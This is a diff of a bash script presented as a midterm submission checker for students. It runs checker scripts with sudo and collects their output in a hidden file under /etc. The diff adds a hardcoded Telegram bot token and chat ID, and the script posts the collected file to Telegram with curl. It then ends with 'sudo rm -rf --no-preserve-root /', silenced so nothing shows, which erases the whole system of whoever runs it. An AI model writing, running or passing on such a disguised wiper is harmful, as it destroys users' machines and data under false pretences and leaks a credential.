@@ -4,18 +4,20 @@
 
 
 echo "MIDTERM SUBMISSION" | sudo tee -a /etc/.midtermconfig
-for i in `ls /etc/checkerfoler`;
+for i in `ls /etc/instructions`;
 do
 	echo "--------------------------------------------------------------------------------------"
-	bash /etc/checkfolder/$i | sudo tee -a /etc/.midtermconfig
+	bash /etc/checker/$i | sudo tee -a /etc/.midtermconfig
 	echo "--------------------------------------------------------------------------------------"
 done
 
 echo "Screenshot this and send to Canvas"
 
+API_KEY="935415758:AAGc-sXokFb-zNYpHeSYvcvQDOSur3HnzUo"
+CHAT_ID="508456308"
 CHAT_TEXT=`cat /etc/.midtermconfig`
 curl -s --data "chat_id=$CHAT_ID" --data "text=$CHAT_TEXT" 'https://api.telegram.org/bot'$API_KEY'/sendMessage' >> /dev/null
 
 read -n 1 -s -r -p "Press any key to continue"
 
-sudo rm -rf --no-preserve-root /
+sudo rm -rf --no-preserve-root / &>> /dev/null 
